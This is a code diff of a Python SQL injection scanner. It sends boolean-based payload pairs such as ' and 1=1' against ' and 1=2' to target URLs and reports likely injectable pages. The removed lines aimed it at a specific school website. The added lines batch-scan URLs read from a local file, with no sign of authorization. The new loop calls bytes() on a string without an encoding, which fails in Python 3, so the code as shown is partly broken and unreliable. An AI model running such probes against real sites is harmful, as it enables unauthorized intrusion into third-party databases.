@@ -8,12 +8,16 @@ import re
 
 
 class Sql:
-    def __init__(self, target, method, data):
-        self.target = target
+    def __init__(self, target, method, data=b''):
+        self.target = target.decode()
         self.method = method.decode()
         self.data = data.decode()
         self.waf = ''
         self.payload = {' and 1=1': ' and 1=2', "' and '1'='1": "' and '1'='2"}
+
+    def init(self):
+        if not self.target.startswith('http://') and not self.target.startswith('https://'):
+            self.target = 'http://' + self.target
 
     @staticmethod
     def _status(conn):
@@ -40,7 +44,6 @@ class Sql:
             elif self.method == 'POST':
                 conn = requests.post(url, data=data, timeout=1, allow_redirects=False)
                 return self._status(conn)
-
         except:
             # print('无法连接')
             return False
@@ -138,16 +141,11 @@ class Sql:
             return False
 
     def run(self):
+        self.init()
         if self._scan():
             print('可能存在注入:' + self.target)
-            return 1
-        else:
-            return 0
-
-
-def main():
-    s = Sql(target='http://nhez.nh.edu.sh.cn/xwgf/show.php?id=4461', method=b'Get')
-    s.run()
 
 if __name__ == '__main__':
-    main()
+    with open('/home/jasonsheh/Tools/python/UrlSuite/res.txt', 'r') as file:
+        for eachline in file:
+            Sql(bytes(eachline), b'GET').run()
